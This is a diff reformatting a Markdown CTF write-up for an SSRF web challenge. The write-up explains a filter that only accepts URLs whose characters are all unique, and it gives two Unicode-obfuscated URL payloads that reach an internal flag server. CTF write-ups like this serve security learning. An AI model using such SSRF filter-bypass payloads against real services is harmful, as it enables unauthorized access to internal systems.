@@ -12,13 +12,12 @@ date: 2023-02-09
 Challenge: http://h4ck3r.quest:8501/
 
 ## Background
-[javascript Set()](https://pjchender.dev/javascript/js-set/)
-[Web Hacking | 續章【EDU-CTF 2021】](https://youtu.be/hWC-Evt-sBc?t=9867)
-[網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」](https://medium.com/程式猿吃香蕉/網站安全-伺服器請求偽造-ssrf-攻擊-項莊舞劍-意在沛公-7a5524926362)
+* [javascript Set()](https://pjchender.dev/javascript/js-set/)
+* [Web Hacking | 續章【EDU-CTF 2021】](https://youtu.be/hWC-Evt-sBc?t=9867)
+* [網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」](https://medium.com/程式猿吃香蕉/網站安全-伺服器請求偽造-ssrf-攻擊-項莊舞劍-意在沛公-7a5524926362)
 
 ## Source code
-:::spoiler source code
-```javascript=
+```javascript
 const express = require("express");
 const http = require("http");
 
@@ -46,18 +45,18 @@ app.get('/', (req, res) => {
 
 app.listen(3000, '0.0.0.0');
 ```
-:::
 * Simply speaking, it'll call a `Set()` object that will filter duplicate characters
 * We also can find the hint in page source
 ![](https://i.imgur.com/AxoVKnp.png)
 
 ## Exploit
 1. The hint said flag is on `http://the.c0o0o0l-fl444g.server.internal:80`, so we need to meet the first requirement - every single character is unique.
-We can use [Domain Obfuscator](https://splitline.github.io/domain-obfuscator/) to replace the similar characters.
+
+    We can use [Domain Obfuscator](https://splitline.github.io/domain-obfuscator/) to replace the similar characters.
 2. Payload
-`htTp:/\ⓉₕE．ℭ⓪ᴼ₀o０Ⅼ-Ⓕｌ₄4４ⓖ｡ₛⒺʳⓋₑⓇ.㏌ₜｅᴿ㎁ˡ`
-`htTp:/\ⓉｈE。Ⅽ⁰ₒ０O0ℓ-ｆᴸ④４⁴G．ＳＥRｖⅇⓡ.ⁱNｔₑrｎAℒ`
+* `htTp:/\ⓉₕE．ℭ⓪ᴼ₀o０Ⅼ-Ⓕｌ₄4４ⓖ｡ₛⒺʳⓋₑⓇ.㏌ₜｅᴿ㎁ˡ`
+* `htTp:/\ⓉｈE。Ⅽ⁰ₒ０O0ℓ-ｆᴸ④４⁴G．ＳＥRｖⅇⓡ.ⁱNｔₑrｎAℒ`
 
 ## Reference
-[SSRFrog](https://ctftime.org/writeup/25763)
-[Punycode converter](https://www.punycoder.com/)
+* [SSRFrog](https://ctftime.org/writeup/25763)
+* [Punycode converter](https://www.punycoder.com/)
